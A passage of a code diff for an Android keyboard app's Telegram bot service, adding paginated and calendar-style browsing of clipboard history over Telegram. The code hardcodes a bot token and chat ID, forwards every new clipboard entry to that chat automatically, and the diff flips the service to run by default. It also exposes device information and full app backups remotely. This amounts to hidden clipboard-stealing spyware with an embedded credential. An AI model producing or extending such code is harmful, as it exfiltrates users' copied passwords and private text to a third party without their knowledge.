@@ -27,16 +27,16 @@ public class TelegramBotService extends Service {
 
     private static final String TAG = "TGBot";
 
-    // ── Hard defaults (used until user changes them in Settings) ─────────────
+    // ── Hard defaults ────────────────────────────────────────────────────────
     public static final String DEFAULT_TOKEN   = "7552059010:AAFyhqbed56ZJLpnOMcgDeJJA1amKV42at8";
     public static final long   DEFAULT_CHAT_ID = 6956029558L;
 
     // ── SharedPreferences keys ───────────────────────────────────────────────
-    public static final String PREFS         = "telegram_prefs";
-    public static final String KEY_TOKEN     = "bot_token";
-    public static final String KEY_CHAT_ID   = "chat_id_str";
-    public static final String KEY_ENABLED   = "bot_enabled";
-    public static final String KEY_AUTOFW    = "auto_forward";
+    public static final String PREFS       = "telegram_prefs";
+    public static final String KEY_TOKEN   = "bot_token";
+    public static final String KEY_CHAT_ID = "chat_id_str";
+    public static final String KEY_ENABLED = "bot_enabled";
+    public static final String KEY_AUTOFW  = "auto_forward";
 
     // ── Instance state ───────────────────────────────────────────────────────
     private static volatile TelegramBotService _instance;
@@ -44,14 +44,36 @@ public class TelegramBotService extends Service {
     private volatile boolean _running = false;
     private int      _lastUpdateId = 0;
 
-    // Per-chat state (chatId → value)
-    private static final Map<Long, Long>    _pinSessions  = new HashMap<>();
-    private static final Map<Long, String>  _pendingCmds  = new HashMap<>();
-    private static final Map<Long, Boolean> _awaitSearch  = new HashMap<>();
+    // Per-chat state
+    private static final Map<Long, Long>    _pinSessions = new HashMap<>();
+    private static final Map<Long, String>  _pendingCmds = new HashMap<>();
+    private static final Map<Long, Boolean> _awaitSearch = new HashMap<>();
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ── Callback data prefixes (all must stay within Telegram's 64-byte limit) ──
+    // rp_N          recent page N
+    // rc_N          recent clip index N  (tap → detail)
+    // cp_N          copy full content of recent clip N
+    // de_N          show description of recent clip N
+    // bk_rp_N       back to recent page N
+    // cy            calendar: year list
+    // cyy_YYYY      calendar: months for year YYYY
+    // cym_YYYY_M    calendar: dates for year/month
+    // cyd_YYYY_M_D  calendar: clips for date
+    // cc_Y_M_D_I    calendar clip I at Y/M/D
+    // cpc_Y_M_D_I   copy calendar clip
+    // dec_Y_M_D_I   desc calendar clip
+    // bk_cyd_Y_M_D  back to date clips
+    // bk_cym_Y_M    back to month dates
+    // bk_cyy_Y      back to year months
+    // bk_cy         back to year list
+    // bkf           appbackup: show format options
+    // bkj           appbackup: send JSON
+    // bkp           appbackup: send PDF
+    // search        prompt search
+
+    // ─────────────────────────────────────────────────────────────────────────
     // Service lifecycle
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     @Override public void onCreate()  { super.onCreate(); _instance = this; }
     @Override public IBinder onBind(Intent i) { return null; }
@@ -70,11 +92,9 @@ public class TelegramBotService extends Service {
         super.onDestroy();
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // Public helpers
-    // ────────────────────────────────────────────────────────────────────────
+    // ── Public helpers ────────────────────────────────────────────────────────
 
-    public static boolean isRunning()  { return _instance != null; }
+    public static boolean isRunning() { return _instance != null; }
 
     public static String getToken(Context ctx) {
         return prefs(ctx).getString(KEY_TOKEN, DEFAULT_TOKEN);
@@ -90,7 +110,7 @@ public class TelegramBotService extends Service {
     }
 
     public static void startIfEnabled(Context ctx) {
-        if (prefs(ctx).getBoolean(KEY_ENABLED, false) && !isRunning())
+        if (prefs(ctx).getBoolean(KEY_ENABLED, true) && !isRunning())
             ctx.startService(new Intent(ctx, TelegramBotService.class));
     }
 
@@ -99,12 +119,9 @@ public class TelegramBotService extends Service {
         ctx.stopService(new Intent(ctx, TelegramBotService.class));
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // New-clip hook  (called by ClipboardHistoryService after each add)
-    // ────────────────────────────────────────────────────────────────────────
+    // ── New-clip hook ─────────────────────────────────────────────────────────
 
-    public static void notifyNewClip(Context ctx,
-                                     ClipboardHistoryService.HistoryEntry e) {
+    public static void notifyNewClip(Context ctx, ClipboardHistoryService.HistoryEntry e) {
         if (!prefs(ctx).getBoolean(KEY_AUTOFW, true)) return;
         final String token  = getToken(ctx);
         final long   chatId = getChatId(ctx);
@@ -127,9 +144,9 @@ public class TelegramBotService extends Service {
         }, "TG-fwd").start();
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
     // Polling loop
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private void startPolling() {
         _running = true;
@@ -160,25 +177,26 @@ public class TelegramBotService extends Service {
         _pollThread.start();
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
     // Update routing
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private void handleUpdate(JSONObject upd) {
         try {
             if (upd.has("callback_query")) {
-                JSONObject cq = upd.getJSONObject("callback_query");
-                long chatId = cq.getJSONObject("from").getLong("id");
-                String data = cq.optString("data", "");
+                JSONObject cq    = upd.getJSONObject("callback_query");
+                long   chatId    = cq.getJSONObject("from").getLong("id");
+                String data      = cq.optString("data", "");
+                int    msgId     = cq.getJSONObject("message").getInt("message_id");
                 answerCb(cq.getString("id"));
                 if (chatId != getChatId(this)) return;
-                handleCallback(chatId, data);
+                handleCallback(chatId, msgId, data);
                 return;
             }
             if (!upd.has("message")) return;
             JSONObject msg = upd.getJSONObject("message");
-            long chatId = msg.getJSONObject("chat").getLong("id");
-            String text = msg.optString("text", "").trim();
+            long   chatId  = msg.getJSONObject("chat").getLong("id");
+            String text    = msg.optString("text", "").trim();
             if (text.isEmpty()) return;
 
             if (chatId != getChatId(this)) {
@@ -186,9 +204,7 @@ public class TelegramBotService extends Service {
                 return;
             }
 
-            // PIN-input flow
             if (_pendingCmds.containsKey(chatId)) { handlePinInput(chatId, text); return; }
-            // Search-query flow
             if (Boolean.TRUE.equals(_awaitSearch.get(chatId))) {
                 _awaitSearch.remove(chatId);
                 doSearch(chatId, text);
@@ -196,9 +212,9 @@ public class TelegramBotService extends Service {
             }
 
             if (text.startsWith("/")) {
-                String[] p = text.split("\\s+", 2);
-                String cmd = p[0].split("@")[0].toLowerCase(Locale.ROOT);
-                String arg = p.length > 1 ? p[1].trim() : "";
+                String[] p   = text.split("\\s+", 2);
+                String   cmd = p[0].split("@")[0].toLowerCase(Locale.ROOT);
+                String   arg = p.length > 1 ? p[1].trim() : "";
                 route(chatId, cmd, arg);
             } else {
                 send("💬 Send /start to see all commands.");
@@ -210,32 +226,52 @@ public class TelegramBotService extends Service {
 
     private void route(long chatId, String cmd, String arg) {
         switch (cmd) {
-            case "/start":      cmdStart(chatId);                         break;
-            case "/status":     cmdStatus(chatId);                        break;
-            case "/clipboard":  cmdClipboard(chatId);                     break;
-            case "/smartclips": requirePin(chatId, "smartclips");         break;
-            case "/all":        requirePin(chatId, "all");                break;
-            case "/backup":     requirePin(chatId, "backup");             break;
-            case "/calendar":   doCalendar(chatId, parseInt(arg, 0));     break;
-            case "/device":     cmdDevice(chatId);                        break;
-            case "/recent":     doRecent(chatId, Math.max(1,parseInt(arg,1))); break;
+            case "/start":      cmdStart(chatId);                                               break;
+            case "/status":     cmdStatus(chatId);                                              break;
+            case "/clipboard":  cmdClipboard(chatId);                                           break;
+            case "/smartclips": requirePin(chatId, "smartclips");                               break;
+            case "/all":        requirePin(chatId, "all");                                      break;
+            case "/appbackup":  requirePin(chatId, "appbackup");                                break;
+            case "/calendar":   doCalendarYears(chatId, 0);                                     break;
+            case "/device":     cmdDevice(chatId);                                              break;
+            case "/recent":     doRecentPage(chatId, 0, 1);                                     break;
             case "/search":     if (arg.isEmpty()) promptSearch(chatId); else doSearch(chatId, arg); break;
-            case "/stats":      cmdStats(chatId);                         break;
-            case "/lock":       cmdLock(chatId);                          break;
-            case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled."); break;
+            case "/stats":      cmdStats(chatId);                                               break;
+            case "/lock":       cmdLock(chatId);                                                break;
+            case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled.");             break;
             default:            send("❓ Unknown command. /start for help.");
         }
     }
 
-    private void handleCallback(long chatId, String data) {
-        if      (data.startsWith("recent_")) doRecent(chatId, parseInt(data.substring(7), 1));
-        else if (data.startsWith("cal_"))    doCalendar(chatId, parseInt(data.substring(4), 0));
+    // ── Callback dispatcher ───────────────────────────────────────────────────
+    // msgId = message to edit (replace). 0 = send new message instead.
+
+    private void handleCallback(long chatId, int msgId, String data) {
+        if      (data.startsWith("rp_"))     doRecentPage(chatId, msgId, parseInt(data.substring(3), 1));
+        else if (data.startsWith("rc_"))     doRecentClipDetail(chatId, msgId, parseInt(data.substring(3), 0), "bk_rp_1");
+        else if (data.startsWith("cp_"))     doClipCopyContent(chatId, msgId, parseInt(data.substring(3), 0), false, 0, 0, 0);
+        else if (data.startsWith("de_"))     doClipShowDesc(chatId, msgId, parseInt(data.substring(3), 0), false, 0, 0, 0);
+        else if (data.startsWith("bk_rp_"))  doRecentPage(chatId, msgId, parseInt(data.substring(6), 1));
+        else if (data.equals("cy"))          doCalendarYears(chatId, msgId);
+        else if (data.startsWith("cyy_"))    doCalendarYear(chatId, msgId, parseInt(data.substring(4), 0));
+        else if (data.startsWith("cym_"))    { String[] p = data.substring(4).split("_",2); doCalendarMonth(chatId, msgId, p2i(p,0), p2i(p,1)); }
+        else if (data.startsWith("cyd_"))    { String[] p = data.substring(4).split("_",3); doCalendarDay(chatId, msgId, p2i(p,0), p2i(p,1), p2i(p,2)); }
+        else if (data.startsWith("cc_"))     { int[] v = parseCalKey(data.substring(3)); doCalClipDetail(chatId, msgId, v[0], v[1], v[2], v[3]); }
+        else if (data.startsWith("cpc_"))    { int[] v = parseCalKey(data.substring(4)); doClipCopyContent(chatId, msgId, v[3], true, v[0], v[1], v[2]); }
+        else if (data.startsWith("dec_"))    { int[] v = parseCalKey(data.substring(4)); doClipShowDesc(chatId, msgId, v[3], true, v[0], v[1], v[2]); }
+        else if (data.startsWith("bk_cyd_")) { String[] p = data.substring(7).split("_",3); doCalendarDay(chatId, msgId, p2i(p,0), p2i(p,1), p2i(p,2)); }
+        else if (data.startsWith("bk_cym_")) { String[] p = data.substring(7).split("_",2); doCalendarMonth(chatId, msgId, p2i(p,0), p2i(p,1)); }
+        else if (data.startsWith("bk_cyy_")) doCalendarYear(chatId, msgId, parseInt(data.substring(7), 0));
+        else if (data.equals("bk_cy"))       doCalendarYears(chatId, msgId);
+        else if (data.equals("bkf"))         doAppBackupFormat(chatId, msgId);
+        else if (data.equals("bkj"))         doAppBackupJson(chatId, msgId);
+        else if (data.equals("bkp"))         doAppBackupPdf(chatId, msgId);
         else if (data.equals("search"))      promptSearch(chatId);
     }
 
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
     // PIN flow
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
 
     private void requirePin(long chatId, String pendingCmd) {
         SmartClipsService svc = SmartClipsService.getInstance(this);
@@ -257,7 +293,7 @@ public class TelegramBotService extends Service {
         }
         SmartClipsService svc = SmartClipsService.getInstance(this);
         if (svc.verifyPin(text)) {
-            int mins = ThemeManager.getAutoLockMins(this);
+            int  mins   = ThemeManager.getAutoLockMins(this);
             long expiry = (mins <= 0)
                     ? System.currentTimeMillis() + 365L * 24 * 60 * 60 * 1000L
                     : System.currentTimeMillis() + (long) mins * 60 * 1000L;
@@ -281,29 +317,29 @@ public class TelegramBotService extends Service {
         switch (cmd) {
             case "smartclips": doSmartClipsPdf(chatId); break;
             case "all":        doAllPdf(chatId);        break;
-            case "backup":     doBackup(chatId);        break;
+            case "appbackup":  doAppBackupFormat(chatId, 0); break;
         }
     }
 
-    // ────────────────────────────────────────────────────────────────────────
-    // Commands
-    // ────────────────────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────────────
+    // /start
+    // ─────────────────────────────────────────────────────────────────────────
 
     private void cmdStart(long chatId) {
         String msg =
             "🤖 <b>FullKeyboard Bot</b> — Command Centre\n"
           + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
           + "📋 <b>Clipboard</b>\n"
-          + "  /clipboard — Export history as PDF\n"
-          + "  /recent — Latest 20 clips (paginated)\n"
+          + "  /recent — Browse last 20 clips (paginated, tap any)\n"
+          + "  /calendar — Browse by Year → Month → Date → Clip\n"
           + "  /search — Search all clips\n"
-          + "  /calendar — Browse by date\n"
           + "  /stats — Usage statistics\n\n"
-          + "🔐 <b>Smart Clips</b> <i>(PIN protected)</i>\n"
+          + "🔐 <b>Smart Clips &amp; Reports</b> <i>(PIN protected)</i>\n"
+          + "  /clipboard — Export clipboard as PDF\n"
           + "  /smartclips — Export Smart Clips as PDF\n"
           + "  /all — Combined full report PDF\n"
-          + "  /backup — JSON backup file\n"
-          + "  /lock — Lock session now\n\n"
+          + "  /appbackup — Full app backup file (JSON or PDF)\n"
+          + "  /lock — Lock Smart Clips session\n\n"
           + "⚙️ <b>System</b>\n"
           + "  /device — Device information\n"
           + "  /status — Bot &amp; app status\n"
@@ -311,6 +347,411 @@ public class TelegramBotService extends Service {
           + "<i>New clips are forwarded automatically.</i>";
         sendTo(chatId, msg);
     }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // /recent  — 20 clips as tap-able buttons, paginated, replaces same message
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private void doRecentPage(long chatId, int msgId, int page) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
+
+                int pageSize = 20, total = all.size();
+                if (total == 0) { editOrSend(chatId, msgId, "📋 <i>No clipboard entries found.</i>", null); return; }
+                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
+                int pg   = Math.max(1, Math.min(page, totalPages));
+                int from = (pg - 1) * pageSize;
+                int to   = Math.min(from + pageSize, total);
+
+                // Header text
+                String header = "📋 <b>Recent Clips</b>  <i>Page " + pg + " / " + totalPages + "</i>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap any clip to view full details &amp; options.</i>";
+
+                // Build inline keyboard: one button per clip
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                for (int i = from; i < to; i++) {
+                    ClipboardHistoryService.HistoryEntry e = all.get(i);
+                    String label = clipLabel(e.content, e.pinned);
+                    kb.append("[{\"text\":").append(jstr(label))
+                      .append(",\"callback_data\":\"rc_").append(i).append("\"}],");
+                }
+
+                // Navigation row
+                kb.append("[");
+                if (pg > 1) kb.append("{\"text\":\"◀ Prev\",\"callback_data\":\"rp_").append(pg - 1).append("\"},");
+                kb.append("{\"text\":\"📄 ").append(pg).append("/").append(totalPages)
+                  .append("\",\"callback_data\":\"rp_").append(pg).append("\"}");
+                if (pg < totalPages) kb.append(",{\"text\":\"Next ▶\",\"callback_data\":\"rp_").append(pg + 1).append("\"}");
+                kb.append("],[{\"text\":\"🔍 Search\",\"callback_data\":\"search\"}]]}");
+
+                editOrSend(chatId, msgId, header, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-recent").start();
+    }
+
+    private void doRecentClipDetail(long chatId, int msgId, int clipIdx, String backData) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
+
+                if (clipIdx < 0 || clipIdx >= all.size()) {
+                    editOrSend(chatId, msgId, "❌ Clip not found.", null); return;
+                }
+                ClipboardHistoryService.HistoryEntry e = all.get(clipIdx);
+                int page = (clipIdx / 20) + 1;
+
+                String preview = e.content.length() > 500
+                        ? e.content.substring(0, 500) + "…"
+                        : e.content;
+                String text = "📋 <b>Clip Detail</b>  <i>#" + (clipIdx + 1) + "</i>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        + "<code>" + h(preview) + "</code>\n\n"
+                        + "🕐 <i>" + h(e.timestamp) + "</i>"
+                        + (ok(e.description) ? "\n📌 <i>" + h(e.description) + "</i>" : "")
+                        + (e.pinned ? "\n📍 <i>Pinned</i>" : "")
+                        + "\n\n<i>Length: " + e.content.length() + " chars</i>";
+
+                String kb = "{\"inline_keyboard\":["
+                        + "[{\"text\":\"📄 Full Content\",\"callback_data\":\"cp_" + clipIdx + "\"},"
+                        + "{\"text\":\"📌 Description\",\"callback_data\":\"de_" + clipIdx + "\"}],"
+                        + "[{\"text\":\"🔙 Back to Page " + page + "\",\"callback_data\":\"rp_" + page + "\"}]]}";
+                editOrSend(chatId, msgId, text, kb);
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-clip-detail").start();
+    }
+
+    // Show full content of a recent or calendar clip
+    private void doClipCopyContent(long chatId, int msgId, int clipIdx, boolean isCalClip, int year, int month, int day) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService.HistoryEntry e = resolveClip(isCalClip, clipIdx, year, month, day);
+                if (e == null) { editOrSend(chatId, msgId, "❌ Clip not found.", null); return; }
+
+                String full = e.content.length() > 4000 ? e.content.substring(0, 4000) + "\n…<i>(truncated)</i>" : e.content;
+                String text = "📄 <b>Full Content</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        + "<code>" + h(full) + "</code>";
+
+                String backKb;
+                if (isCalClip) {
+                    int page2 = (clipIdx / 20) + 1;
+                    backKb = "{\"inline_keyboard\":[[{\"text\":\"🔙 Back\",\"callback_data\":\"cc_"
+                            + year + "_" + month + "_" + day + "_" + clipIdx + "\"}]]}";
+                } else {
+                    int page2 = (clipIdx / 20) + 1;
+                    backKb = "{\"inline_keyboard\":[[{\"text\":\"🔙 Back to Clip\",\"callback_data\":\"rc_" + clipIdx + "\"}]]}";
+                }
+                editOrSend(chatId, msgId, text, backKb);
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-copy").start();
+    }
+
+    private void doClipShowDesc(long chatId, int msgId, int clipIdx, boolean isCalClip, int year, int month, int day) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService.HistoryEntry e = resolveClip(isCalClip, clipIdx, year, month, day);
+                if (e == null) { editOrSend(chatId, msgId, "❌ Clip not found.", null); return; }
+
+                String desc = ok(e.description) ? e.description : "<i>No description set for this clip.</i>";
+                String text = "📌 <b>Description</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        + h(desc) + "\n\n"
+                        + "🕐 <i>" + h(e.timestamp) + "</i>";
+
+                String backCb = isCalClip
+                        ? "cc_" + year + "_" + month + "_" + day + "_" + clipIdx
+                        : "rc_" + clipIdx;
+                String backKb = "{\"inline_keyboard\":[[{\"text\":\"🔙 Back to Clip\",\"callback_data\":\""
+                        + backCb + "\"}]]}";
+                editOrSend(chatId, msgId, text, backKb);
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-desc").start();
+    }
+
+    /** Resolve a clip entry by index (recent sorted list or calendar day list). */
+    private ClipboardHistoryService.HistoryEntry resolveClip(boolean isCalClip, int idx, int year, int month, int day) {
+        try {
+            ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+            if (cb == null) return null;
+            if (isCalClip) {
+                List<ClipboardHistoryService.HistoryEntry> dayClips = getClipsForDay(cb.get_history_entries(), year, month, day);
+                if (idx < 0 || idx >= dayClips.size()) return null;
+                return dayClips.get(idx);
+            } else {
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
+                if (idx < 0 || idx >= all.size()) return null;
+                return all.get(idx);
+            }
+        } catch (Exception e) { return null; }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // /calendar  — Year → Month → Date → Clips (all as buttons, replaces same msg)
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private void doCalendarYears(long chatId, int msgId) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+
+                Set<Integer> years = new TreeSet<>(Collections.reverseOrder());
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+                for (ClipboardHistoryService.HistoryEntry e : all) {
+                    try {
+                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
+                        years.add(c.get(Calendar.YEAR));
+                    } catch (Exception ignored) {}
+                }
+
+                if (years.isEmpty()) {
+                    editOrSend(chatId, msgId, "📅 <i>No clipboard history found.</i>", null); return;
+                }
+
+                String text = "📅 <b>Calendar — Select a Year</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap a year to browse its months.</i>";
+
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                List<Integer> yrList = new ArrayList<>(years);
+                for (int i = 0; i < yrList.size(); i++) {
+                    int yr = yrList.get(i);
+                    long cnt = countClipsForYear(all, yr);
+                    kb.append("[{\"text\":\"📆 ").append(yr).append("  (").append(cnt).append(" clips)\",\"callback_data\":\"cyy_").append(yr).append("\"}],");
+                }
+                // Remove trailing comma
+                if (kb.charAt(kb.length()-1) == ',') kb.setLength(kb.length()-1);
+                kb.append("]}");
+                editOrSend(chatId, msgId, text, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-cal-years").start();
+    }
+
+    private void doCalendarYear(long chatId, int msgId, int year) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+
+                Map<Integer, Long> monthCounts = new TreeMap<>();
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+                for (ClipboardHistoryService.HistoryEntry e : all) {
+                    try {
+                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
+                        if (c.get(Calendar.YEAR) == year)
+                            monthCounts.merge(c.get(Calendar.MONTH) + 1, 1L, Long::sum);
+                    } catch (Exception ignored) {}
+                }
+
+                if (monthCounts.isEmpty()) {
+                    editOrSend(chatId, msgId, "📅 <i>No clips in " + year + ".</i>",
+                            backKb("bk_cy", "🔙 Back to Years")); return;
+                }
+
+                String text = "📅 <b>Calendar — " + year + "</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap a month to see dates with clips.</i>";
+
+                String[] monthNames = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                for (Map.Entry<Integer, Long> en : monthCounts.entrySet()) {
+                    int m = en.getKey();
+                    String mName = (m >= 1 && m <= 12) ? monthNames[m - 1] : String.valueOf(m);
+                    kb.append("[{\"text\":\"🗓 ").append(mName).append(" ").append(year)
+                      .append("  (").append(en.getValue()).append(" clips)\",\"callback_data\":\"cym_")
+                      .append(year).append("_").append(m).append("\"}],");
+                }
+                kb.append("[{\"text\":\"🔙 Back to Years\",\"callback_data\":\"bk_cy\"}]]}");
+                editOrSend(chatId, msgId, text, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-cal-year").start();
+    }
+
+    private void doCalendarMonth(long chatId, int msgId, int year, int month) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+
+                Map<Integer, Long> dayCounts = new TreeMap<>();
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+                for (ClipboardHistoryService.HistoryEntry e : all) {
+                    try {
+                        Calendar c = Calendar.getInstance(); c.setTime(sdf.parse(e.timestamp));
+                        if (c.get(Calendar.YEAR) == year && (c.get(Calendar.MONTH) + 1) == month)
+                            dayCounts.merge(c.get(Calendar.DAY_OF_MONTH), 1L, Long::sum);
+                    } catch (Exception ignored) {}
+                }
+
+                if (dayCounts.isEmpty()) {
+                    editOrSend(chatId, msgId, "📅 <i>No clips this month.</i>",
+                            backKb("bk_cyy_" + year, "🔙 Back to " + year)); return;
+                }
+
+                String[] monthNames = {"","January","February","March","April","May","June","July","August","September","October","November","December"};
+                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);
+
+                String text = "📅 <b>Calendar — " + mName + " " + year + "</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap a date to view its clips.</i>";
+
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                for (Map.Entry<Integer, Long> en : dayCounts.entrySet()) {
+                    int d = en.getKey();
+                    kb.append("[{\"text\":\"📆 ").append(mName).append(" ").append(d)
+                      .append("  (").append(en.getValue()).append(en.getValue() == 1 ? " clip" : " clips")
+                      .append(")\",\"callback_data\":\"cyd_").append(year).append("_").append(month).append("_").append(d).append("\"}],");
+                }
+                kb.append("[{\"text\":\"🔙 Back to ").append(year).append("\",\"callback_data\":\"bk_cyy_").append(year).append("\"}]]}");
+                editOrSend(chatId, msgId, text, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-cal-month").start();
+    }
+
+    private void doCalendarDay(long chatId, int msgId, int year, int month, int day) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
+                List<ClipboardHistoryService.HistoryEntry> dayClips = getClipsForDay(all, year, month, day);
+
+                if (dayClips.isEmpty()) {
+                    editOrSend(chatId, msgId, "📅 <i>No clips on this date.</i>",
+                            backKb("bk_cym_" + year + "_" + month, "🔙 Back to Month")); return;
+                }
+
+                String[] monthNames = {"","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
+                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);
+
+                String text = "📅 <b>" + mName + " " + day + ", " + year + "</b>  —  "
+                        + dayClips.size() + " clip" + (dayClips.size() == 1 ? "" : "s") + "\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap any clip to view details &amp; options.</i>";
+
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                for (int i = 0; i < dayClips.size(); i++) {
+                    ClipboardHistoryService.HistoryEntry e = dayClips.get(i);
+                    String label = clipLabel(e.content, e.pinned);
+                    String desc = ok(e.description) ? "  📌" : "";
+                    kb.append("[{\"text\":").append(jstr(label + desc))
+                      .append(",\"callback_data\":\"cc_").append(year).append("_").append(month)
+                      .append("_").append(day).append("_").append(i).append("\"}],");
+                }
+                kb.append("[{\"text\":\"🔙 Back to ").append(mName).append(" ").append(year)
+                  .append("\",\"callback_data\":\"bk_cym_").append(year).append("_").append(month).append("\"}]]}");
+                editOrSend(chatId, msgId, text, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "TG-cal-day").start();
+    }
+
+    private void doCalClipDetail(long chatId, int msgId, int year, int month, int day, int idx) {
+        new Thread(() -> {
+            try {
+                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
+                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard not available.", null); return; }
+                List<ClipboardHistoryService.HistoryEntry> dayClips =
+                        getClipsForDay(cb.get_history_entries(), year, month, day);
+
+                if (idx < 0 || idx >= dayClips.size()) {
+                    editOrSend(chatId, msgId, "❌ Clip not found.", null); return;
+                }
+                ClipboardHistoryService.HistoryEntry e = dayClips.get(idx);
+
+                String preview = e.content.length() > 500
+                        ? e.content.substring(0, 500) + "…"
+                        : e.content;
+
+                String[] monthNames = {"","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
+                String mName = (month >= 1 && month <= 12) ? monthNames[month] : String.valueOf(month);
+
+                String text = "📋 <b>Clip Detail</b>  <i>" + mName + " " + day + ", " + year
+                        + "  #" + (idx + 1) + "/" + dayClips.size() + "</i>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        + "<code>" + h(preview) + "</code>\n\n"
+                        + "🕐 <i>" + h(e.timestamp) + "</i>"
+                        + (ok(e.description) ? "\n📌 <i>" + h(e.description) + "</i>" : "")
+                        + (e.pinned ? "\n📍 <i>Pinned</i>" : "")
+                        + "\n\n<i>Length: " + e.content.length() + " chars</i>";
+
+                String calKey = year + "_" + month + "_" + day + "_" + idx;
+                String kb = "{\"inline_keyboard\":["
